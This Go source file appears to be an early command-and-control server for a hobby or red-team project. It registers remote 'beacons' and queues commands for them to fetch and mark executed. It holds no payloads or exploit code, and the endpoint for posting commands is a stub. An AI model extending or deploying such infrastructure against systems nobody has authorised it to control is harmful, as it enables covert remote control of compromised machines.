package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
)

type Beacon struct {
	ID       int32     `json:"id,omitempty"`
	IP       string    `json:"ip"`
	Hostname string    `json:"hostname"`
	Commands []Command `json:"commands,omitempty"`
}

type Command struct {
	ID       int32  `json:"id,omitempty"`
	BeaconID int32  `json:"beacon_id,omitempty"`
	Type     string `json:"type"`
	Arg      string `json:"arg"`
	Executed bool   `json:"executed,omitempty"`
}

type APIServer struct {
	addr string
	db   *sql.DB
}

func GetNewAPIServer() *APIServer {
	db := GetNewDBServer()
	addr, present := os.LookupEnv("C2_API_ADDR")
	if !present {
		addr = "0.0.0.0:8080"
	}
	return &APIServer{
		addr: addr,
		db:   db,
	}
}

// func (s *APIServer) String() string {
// 	return fmt.Sprintf("%s:%d", s.addr, s.port)
// }

func (s *APIServer) CheckBeaconIDExistence(id int32) (bool, error) {
	dbID := id

	row := s.db.QueryRow("SELECT id FROM beacons WHERE id = ?;", id)
	err := row.Scan(&dbID)

	if err == sql.ErrNoRows {
		return false, nil
	}
	if err != nil {
		return false, err
	}
	if id == dbID {
		return true, nil
	}
	return false, nil
}

func (s *APIServer) GenerateUniqueBeaconID() (int32, error) {
	var id int32
	for {
		id = rand.Int31()
		inDB, err := s.CheckBeaconIDExistence(id)
		if err != nil {
			return id, err
		}
		if !inDB {
			break
		}
	}
	return id, nil
}

func (s *APIServer) Register(beacon Beacon) (int32, error) {
	id, err := s.GenerateUniqueBeaconID()
	if err != nil {
		return -1, err
	}

	_, err = s.db.Exec(
		`INSERT INTO beacons (id, ip, hostname)
		VALUES (?, ?, ?)`,
		id,
		beacon.IP,
		beacon.Hostname,
	)
	if err != nil {
		return -1, err
	}

	return id, nil
}

func (s *APIServer) GetBeacon(id int32) (Beacon, error) {

	row := s.db.QueryRow(
		`SELECT id, ip, hostname
		FROM beacons
		WHERE id = ?;`,
		id,
	)

	beacon := Beacon{}
	err := row.Scan(&beacon.ID, &beacon.IP, &beacon.Hostname)
	if err != nil {
		return Beacon{}, err
	}

	commands, err := s.GetCommands(id)
	if err != nil {
		return Beacon{}, err
	}

	beacon.Commands = commands

	return beacon, nil
}

func (s *APIServer) GetCommands(beacon_id int32) ([]Command, error) {
	rows, err := s.db.Query(
		`SELECT id, beacon_id, c_type, c_arg, executed
		FROM commands
		WHERE beacon_id = ?
		ORDER BY create_time;`,
		beacon_id,
	)
	if err != nil {
		return []Command{}, err
	}

	commands := []Command{}
	for {
		anotherRow := rows.Next()
		if !anotherRow && rows.Err() != nil {
			return []Command{}, err

		} else if !anotherRow {
			break
		}
		c := Command{}
		rows.Scan(&c.ID, &c.BeaconID, &c.Type, &c.Arg, &c.Executed)
		commands = append(commands, c)
	}

	return commands, nil
}

func (s *APIServer) MarkCommandsExecuted(beacon_id int32) error {
	_, err := s.db.Exec(`
		UPDATE commands
		SET seen_by_beacon = 1
		WHERE beacon_id = ?;
		`, beacon_id)

	if err != nil {
		return err
	}

	return nil
}

func (s *APIServer) DeleteBeacon(id int32) error {
	tx, err := s.db.Begin()
	if err != nil {
		return err
	}

	_, execErr := tx.Exec(`DELETE FROM beacons WHERE id = ?`, id)
	if execErr != nil {
		tx.Rollback()
	}

	_, execErr = tx.Exec(`DELETE FROM commands WHERE beacon_id = ?`, id)
	if execErr != nil {
		tx.Rollback()
	}

	err = tx.Commit()
	if err != nil {
		return err
	}

	return nil
}

func (s *APIServer) Run() error {
	router := http.NewServeMux()

	router.HandleFunc("POST /register", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")

		defer r.Body.Close()
		rBody, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w,
				`{"msg": "no request body"}`,
				http.StatusInternalServerError)
			return
		}

		beacon := Beacon{}
		err = json.Unmarshal(rBody, &beacon)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		id, err := s.Register(beacon)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		w.Write(fmt.Appendf(nil,
			`{"msg": "successfully registered",
			"id": %d}`,
			id))
	})

	router.HandleFunc("GET /beacon/{id}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")
		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		id := int32(id64)
		beacon, err := s.GetBeacon(id)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		body, err := json.Marshal(beacon)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		w.Write(body)
	})

	router.HandleFunc("DELETE /beacon/{id}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")
		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"message": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		id := int32(id64)
		err = s.DeleteBeacon(id)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		w.Write(fmt.Appendf(nil, `{"msg": "successfully deleted %d}`, id))
	})

	router.HandleFunc("GET /beacon/{id}/commands", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")
		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"message": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		id := int32(id64)
		commands, err := s.GetCommands(id)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"message": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		if r.URL.Query().Get("mark_executed") == "true" {
			s.MarkCommandsExecuted(id)
		}

		body, err := json.Marshal(commands)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		w.Write(body)
	})

	router.HandleFunc("POST /beacon/{id}/commands", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		w.Write([]byte("Post ID Commands: " + id))
	})
	server := http.Server{
		Addr:    s.addr,
		Handler: router,
	}

	log.Printf("API Server ready: %s", s.addr)

	return server.ListenAndServe()
}
